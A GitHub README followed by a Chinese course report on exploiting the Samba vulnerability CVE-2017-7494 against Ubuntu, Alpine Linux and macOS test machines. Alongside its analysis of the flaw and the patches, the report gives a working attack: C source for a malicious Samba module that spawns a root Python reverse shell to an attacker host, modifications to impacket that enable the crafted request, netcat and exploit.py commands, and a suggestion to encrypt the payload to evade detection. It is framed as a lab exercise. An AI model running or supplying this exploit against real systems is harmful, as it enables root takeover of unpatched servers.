# BIT-EternalBlue-for-macOS&Linux
Exploit CVE-2017-7494 for Net Security course final Assignment. This would reveal the vulnerability of services that run in administrative priority on OS.

This bug is workable on both macOS and Linux.

## Install

Before exploit, you need to download dependencies.

```shell
/bin/bash install_requirement.sh
```

One of the most important dependencies is the `impacket` package for python. It make smb connection works.

However, in order to construct a valid request that make the samba server load our malicious module, we have to modify the original impacket.

The installation `install_requirement.sh` installs a modified version (modified by me) so **you do not have to worry about that and you are not need to do any manual modification**.

However, if you want to use some newer version or another version of `impacket`, you have to modify that package by yourself.

> Goto `impacket/impacket/smb3.py` modify line 11154 and comment following two sentences:

```python
#         fileName = fileName.replace('/', '\\') Should be comment!
        if len(fileName) > 0:
#             fileName = ntpath.normpath(fileName) Should be comment!
            if fileName[0] == '\\':
                fileName = fileName[1:]
```

## How to use

To exploit target, you need open two terminals. One use `netcat` to interact with the reverse shell, the other is used to exploit the BUG.

Usage:

```shell
#First terminal use nc to get reverse shell
$ nc -p 23333 -l

# Second terminal to exploit target
$ python3 ./exploit.py -lhost 192.168.71.136 --rhost 192.168.71.135
```
If the target is macOS, you **should not to** compile the module on Linux! As gcc do not support MACH-O format. If you are a mac user, macOS payload compilation works.

A precompiled version is in the directory. The `mac_payload.so`.

Use `-m` flag to make `exploit.py` know you will use a customized payload.


```shell
python3 ./exploit.py -lhost 192.168.71.136 --rhost 192.168.71.135 -m mac_payload.so
```

## Uninstall

```shell
sudo -H python3 -m pip uninstall impacket
```

## Todo:
- [ ] macOS Samba installation guide.

A detailed process would be post in Chinese as my final assignment. If you understand Chinese, it would be fine for you. :)

---

# 永恒之蓝 for Mac&Linux

—— CVE2017-7494 攻击报告

## 背景介绍

永恒之蓝(*Eternal Blue*)在2017年造成了极大的损失，它利用了Windows SMB的机制进行蠕虫攻击。SMB是运行于Windows上的服务，它可以让不同主机之间共享文件以及进行远程调用(*Remote Procedure Call , RPC*)。也许正是这种性质的功能，使它常常成为黑客攻击的目标。

操作系统内核本身的漏洞应该是相当少的——即使对于Windows也是如此，出问题的通常都是跑在操作系统上的各种服务。它们没有像操作系统有相同规格严格的、经过严谨测试的代码，但却运行在很高的权限上，进而产生了很多可以恶意利用机会。那么我们是否可以通过攻击操作系统上的高权限服务，而不是攻击操作系统的底层组件本身，进而攻陷整个操作呢？单独的操作系统只是一个内核，什么也做不了，它只有运行各种各样的系统服务，才能为我们提供多样的功能。操作系统有许多服务需要配合管理员身份运行才能使用（作为守护进程），因此只要攻陷了这种高权限服务就可以自然而然地获得系统的管理员权限，进而攻陷整个操作系统。

最后，我在SMB的开源实现——Samba上找到了可以利用的漏洞——CVE2017-7494。与Windows类似，黑客可以通过Samba的远程过程调用获取操作系统的管理员权限，进而有机会构造蠕虫病毒在网上进攻。

Linux内核向来以开源带来的安全著称；而macOS作为一个小众系统，由于针对其的病毒少，因此也经常能给人安全的错觉。因此本实验将选取这macOS与几款不同的Linux发行版进行攻击，以显示操作系统的脆弱性——无论操作系统的设计“看起来有多么的安全”，在任何情况下都有可能由于一个小的应用程序的漏洞被攻陷。

## 漏洞分析

由于Samba是和SMB性质等同的服务，因此也有人将其称作“Linux版永恒之蓝”，虽然我认为从技术的角度来说这两者有本质的差异：

* Windows的永恒之蓝利用了缓冲区溢出攻击，而CVE2017-7494则是程序执行逻辑上的漏洞

本次漏洞主要来自`source3\rpc_server\srv_pipe.c`中的`bool is_known_pipename(const char *pipename, struct ndr_syntax_id *syntax)`函数对`smb_probe_module()`的调用 :

```c
bool is_known_pipename(const char *pipename, struct ndr_syntax_id *syntax)
{
	...
	//这里出问题了
	status = smb_probe_module("rpc", pipename);
    ....

```

`is_known_pipename()`的上层函数`np_open()`是一个控制模块，在进行对`RPC`服务请求的检查后会对`is_known_pipename()`进行调用。`is_known_pipename()`从名字上看是用来判断远程管道是否已经注册，但是在Samba 3.50后引入了一个新功能：通过调用`smb_probe_module()`加载动态模块。而本漏洞正是利用了这个加载模块的功能实现自己构造恶意模块的调用。

`rpc pipe`模块的加载有如下调用链条：

`is_known_pipename()` - > `smb_probe_module()` -> `do_smb_load_module()` -> `load_module()`

而在Samba 3.5.0 ~ Samba 4.6.3 的版本间，函数`do_smb_load_module()`被加载RPC模块的`smb_probe_module()`和另一个加载自身模块的`smb_probe_module()`复用。`smb_load_module()`是用来加载一些已知的模块，应该是给Samba自身的功能拓展进行内部调用，如`VFS`模块；而`smb_probe_module()`应意为加载一些可能的模块，模块可能来自`RPC`的请求。

```c
NTSTATUS smb_probe_module(const char *subsystem, const char *module)
{
	return do_smb_load_module(subsystem, module, true);
}

NTSTATUS smb_load_module(const char *subsystem, const char *module)
{
	return do_smb_load_module(subsystem, module, false);
}
```

为了被这两个来源迥异的函数复用（虽然在我看来这两个模块绝对不应该复用同一个模块），`do_smb_load_module()`同时实现了“通过解析请求，在SMB子系统内加载模块”以及“通过绝对路径加载模块”的两种方式。

```c
static NTSTATUS do_smb_load_module(const char *subsystem,
								   const char *module_name, bool is_probe)
{
...
    /* Check for absolute path */
    //注释的注释：如果传入的路径来源是本不应该给出绝对路径的smb_probe_module()，但smb_probe_module()却给出了绝对路径，那么这个检查将会无效，这也是本次漏洞利用的原理。
	if (subsystem && module_name[0] != '/')
	{
		//本来应该进子系统，进行SMB子系统->绝对路径的转换
		full_path = talloc_asprintf(ctx,"%s/%s.%s",	modules_path(ctx, subsystem),module_name,shlib_ext());
        ...
	}
	else
	{
		//但是它直接加载了我们构造的绝对路径,走了这里
		init = load_module(module_name, is_probe, &handle);	
        //这样init就让一个“不存在的pipe的模块”使用了来自绝对路径的模块
	}
	//这里直接进入恶意代码的调用
	status = init();
...
```

由于`do_smb_load_module()`并不知道上层函数提交给它的路径究竟是来自`smb_load_module`还是`smb_probe_module`，因此就产生了让我们构造一个伪造的请求的可能：让原本“在子系统内部加载的模块”变为“对绝对路径的模块的加载”。而如果此时这个绝对路径的模块刚好是我们预定义的恶意模块，那么就成功的进行了漏洞利用。

而比较巧的是，Samba作为一个支持文件传输的协议，我们可以方便的将自己的恶意模块上传上去。于此同时，DCE请求也是支持询问绝对路径的。有了这两个因素，我们可以很轻易的对`do_smb_load_module()`进行利用，让它进行对绝对路径恶意模块的加载。

利用原理图示如下：

<img src="https://cdn.jsdelivr.net/gh/I-Rinka/picTure//image-20210518105421962.png" style="zoom:67%;" />

### Samba对漏洞的修补

在后面的版本中，Samba对这个漏洞进行了修复，主要是增强了对RPC请求传入的管道名的检查。

第一次修补在`is_known_pipename()`处，使用`strchr`检测`pipe`名是否有`/`，有`/`则意为加载Linux的路径，这应该被禁止。

```c
bool is_known_pipename(const char *pipename, struct ndr_syntax_id *syntax)
{
	NTSTATUS status;
    //添加了这一行代码进行检测，防止请求的是绝对路径的模块
	if (strchr(pipename, '/')) {
		DEBUG(1, ("Refusing open on pipe %s\n", pipename));
		return false;
	}

...
```

第二次修补是在`smb_probe_module()`处的修补（看git记录应该是在`4.70`的时候添加的），对比原来的简单直接调用`do_smb_load_module()`，这次添加了更多的精细的规则：

```c
NTSTATUS smb_probe_module(const char *subsystem, const char *module)
{
	...
    //第二重绝对路径检测
	if (strchr(module, '/')) {
		status = NT_STATUS_INVALID_PARAMETER;
		goto done;
	}
	....
done:
	TALLOC_FREE(tmp_ctx);
	return status;
}

```

又添加了一道防线。另外，将加载模块的函数也区分的更为精细化了，将原本的`smb_probe_module()`和`smb_load_module()`拆为了`smb_probe_module()`、`smb_load_module()`和`smb_probe_module_absolute_path()`以加强对恶意模块路径的检测。

## 实验设置

本次实验的Linux靶机使用不同的Linux发行版——Ubuntu和Alpine Linux进行实验，利用docker搭建Samba版本号在4.6.3前3.5.0后的Samba服务器。Samba以守护进程`smbd`运行。

Alpine Linux，是最近兴起的一种以“轻量”和“安全”著称的Linux。与目前常见的Linux不同，它不是采用`glibc`，而是采用`musl libc`作为C语言运行环境；同时使用特别的`buzybox`作为命令行工具。一般而言，不进行重新编译或代码修改，常见Linux软件是无法运行在其上面的。这也因此容易让人产生“对使用GNU库的Linux的攻击无法对Alpine Linux奏效”的想法。

另外，本次实验还进行了对macOS的攻击——这是另外一个容易让人产生迷思的系统。macOS是一个没有主动安全防护措施，但由于针对其进行的攻击少，导致了主流观点容易认为“macOS不存在病毒”。

通过上述设置多种不同的系统、对非缓冲区溢出利用的编程逻辑漏洞进行攻击的实验方式来揭示事实：

* 应用程序漏洞攻击与操作系统的无关性
* 漏洞出现的随机性

### Linux 靶机搭建

Linux的Samba使用`Docker`方便快速部署，需要在`dockerhub`上找到足够古老的旧版本镜像。Ubuntu的Samba来自`rootlogin/samba `，Alpine Linux的Samba来自`servercontainers/samba:4.6.3`。将容器的共享路径设置好即可。

### macOS靶机搭建

macOS使用的版本为11.3 Big Sur。

由于macOS很少作为服务器用途，故没有预编译的旧版本Samba提供安装，因此需要自行编译旧版本Samba。

使用：

```shell
git clone https://github.com/samba-team/samba.git
```

拉取Samba后用`git`的`checkout`功能回退到`4.6.3`版本。

根据[11811 – compile error on Mac OS X 10.11 error: field has incomplete type 'struct timespec' LOADPARM_EXTRA_LOCALS (samba.org)](https://bugzilla.samba.org/show_bug.cgi?id=11811)和[11984 – failed to compile on Mac OS X. (samba.org)](https://bugzilla.samba.org/show_bug.cgi?id=11984#:~:text= It can be,param%2Floadparam.h)提供的记录，macOS版本的Samba存在编译问题，虽然后续版本修复了，但是老版本需要手动添加打上编译方面的补丁：

```shell
curl -fsSL  https://willhaley.com/assets/compile-samba-macos/nss.diff | git apply -
```

同时需要在`lib/param/loadparm.h`增加`#include <time.h>`作为头文件。

最后将编译所需的依赖项目解决后，即可编译、安装并运行macOS版本的Samba。

## 实验步骤

本次实验使用`python`对靶机进行攻击，使用`impacket`包进行SMB的操作。

攻击的大体流程如下：

1. 编译恶意载荷
2. 登录Samba
3. 上传恶意载荷
4. 使用RPC调用恶意构造的路径，让Samba服务器加载恶意载荷
5. 得到root权限的reverse shell

### 恶意载荷的构造

恶意载荷的功能主要是：

* 分离进程
* 打开TCP连接
* 打开shell

以此来获得远程服务器的控制权。

代码如下：

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
#include <stdbool.h>
#include "config.h"
#define COMMAND "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""IP"\","PORT"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"

static void CreateReverseShell()
{
    pid_t pid;
    pid = fork(); // Use subprocess to detach the main samba process
    if (pid == 0)
    {
        umask(0);
        chdir("/");
        execl("/usr/bin/python", "python", "-c", (COMMAND), NULL); // Use python to create TCP connection and setup reverse shell
    }
}
#ifdef __linux__
extern bool become_root(void);
#endif
// When Samba load modules, it automatically call this function as entry point
int samba_init_module(void)
{
    // Character: YOU ARE HACKED
    printf("__  __               ___                 __  __           __            __\n\\ \\/ /___  __  __   /   |  ________     / / / /___ ______/ /_____  ____/ /\n \\  / __ \\/ / / /  / /| | / ___/ _ \\   / /_/ / __ `/ ___/ //_/ _ \\/ __  / \n / / /_/ / /_/ /  / ___ |/ /  /  __/  / __  / /_/ / /__/ ,< /  __/ /_/ /  \n/_/\\____/\\__,_/  /_/  |_/_/   \\___/  /_/ /_/\\__,_/\\___/_/|_|\\___/\\__,_/   \n");
    #ifdef __linux__
    become_root();
    #endif
    CreateReverseShell();
    
    return 0;
}
```

其中，`samba_init_module()`即为Samba调用模块加载函数后的入口，可以作为恶意代码的入口点。

`printf`执行的长串字符是`YOU ARE HACKER`：

```txt
__  __               ___                 __  __           __            __
\ \/ /___  __  __   /   |  ________     / / / /___ ______/ /_____  ____/ /
 \  / __ \/ / / /  / /| | / ___/ _ \   / /_/ / __ `/ ___/ //_/ _ \/ __  / 
 / / /_/ / /_/ /  / ___ |/ /  /  __/  / __  / /_/ / /__/ ,< /  __/ /_/ /  
/_/\____/\__,_/  /_/  |_/_/   \___/  /_/ /_/\__,_/\___/_/|_|\___/\__,_/   
                                                                          
```

以作娱乐用途。

`become_root()`函数是来自Samba的函数，使用`extern`声明方便调用。

* 对于苹果系统来说，不需要使用`become_root`就能以root身份进入reverse shell。同时目前苹果系统在编译的时候会有`extern`不起作用，链接器出问题的状况。尚不清楚原因，故使用`ifdef`规避苹果系统。

函数`CreateReverseShell()`将reverse shell进程和主函数进程分离，以实现后门的效果。

本次reverse shell的恶意载荷使用了python创建，使用`execl`执行python脚本，而并没用C语言版本的，理由如下：

* 在进行代码迁移时，我发现Windows可以检测到编译后恶意模块的二进制版本，因此我推测应该许多安全系统已经具备了检测对编译后的`execl`的检测能力
* python是一个灵活的脚本语言，并且预置到了大部分现代的Unix-like操作系统中，因此调用python应该总能成立。
* 因为python是动态的脚本语言，因此提供了`eval()`函数，我们可以通过对打开reverse shell的脚本进行加密，实际执行的时候进行解密，再调用`eval()`执行恶意载荷，就能实现对第一点安全系统检测的规避。
  * 虽然这一个操作并没有在本次实验中体现，但是确实是可行的
  * 不过无论是`python`还是C语言的reverse shell载荷，在攻击的过程中，macOS都对其完全没有响应。一定程度验证了“macOS是一个没有主动防御手段的操作系统”的想法。

macOS版本的恶意载荷需要使用macOS的`clang`进行编译，因为Linux的`gcc`不支持MACH-O格式的可执行文件。并且编译不需要特地指定mac的`.dylib`后缀，直接使用`.so`后缀进行编译即可。

### Python攻击脚本

python攻击脚本使用python3.7作为运行环境，主要是如下流程：

1. 判断恶意模块是否要自己编译
2. 登录
3. 上传恶意文件
4. 加载恶意模块

入口处使用`Options`进行解析，当用户提供预编译模块时，就使用已有模块而不重新编译，否则利用`lhost`和`lport`参数编译新的模块，以实现reverse shell对攻击者的连接。

由于我们使用的是**恶意路径**，因此我们需要对原来的`impacket`包进行一定修改，以让其可以对Samba服务器发起我们需要的请求。

在 `impacket/impacket/smb3.py` 中将11154 行的两个语句注释掉：

```python
#         fileName = fileName.replace('/', '\\') Should be comment!
        if len(fileName) > 0:
#             fileName = ntpath.normpath(fileName) Should be comment!
            if fileName[0] == '\\':
                fileName = fileName[1:]
```

以实现对“绝对路径的恶意模块”的加载。

其余的登录、上传文件、加载恶意模块均为`impacket`包提供的功能，过不做过多赘述。

### 进行攻击

在攻击前需要使用`netcat`对回传的reverse shell进行监听：

```shell
nc -p 23333 -l
```

接着使用

```shell
python3 ./exploit.py -lhost 192.168.71.136 --rhost 192.168.71.135 -m payload.so
```

就能自动执行上述python脚本，从`netcat`的窗口得到root权限的reverse shell获得远程服务器的控制权限。

### 攻击结果

对Ubuntu进行攻击：

<img src="https://cdn.jsdelivr.net/gh/I-Rinka/picTure//image-20210518125849424.png" style="zoom: 33%;" />

对Alpine Linux进行攻击：

<img src="https://cdn.jsdelivr.net/gh/I-Rinka/picTure//image-20210518122814572.png" style="zoom: 33%;" />

对macOS进行攻击：

<img src="https://cdn.jsdelivr.net/gh/I-Rinka/picTure//image-20210518122541523.png" style="zoom: 33%;" />

从Windows黑入macOS并执行脚本：

<img src="https://cdn.jsdelivr.net/gh/I-Rinka/picTure//image-20210518131040905.png" style="zoom: 50%;" />

## 总结

* 应用层的漏洞和操作系统无关，并且也并不存在“绝对安全”的系统。任何看似安全的系统都有可能被意想不到的方式攻破。
* 关键服务应尽量少运行在管理员权限上，即使被攻破，也不会对主机系统造成过大影响。
* 可以采用容器或者虚拟机等技术来单独运行，例如本次实验的Linux版本使用了容器技术，在进攻后只是Linux容器内部的root，如果不进行其他的容器逃逸漏洞，是无法对物理机造成伤害的。这符合”公共机制的最小化原则“原则。
* 安全问题永远不是单方面的，比如只靠`scanf_s`、`strSafe`以及一些”难以缓冲区溢出的安全的语言“是无法解决所有问题的，可被恶意利用的漏洞也可能在任何意想不到的地方出现。
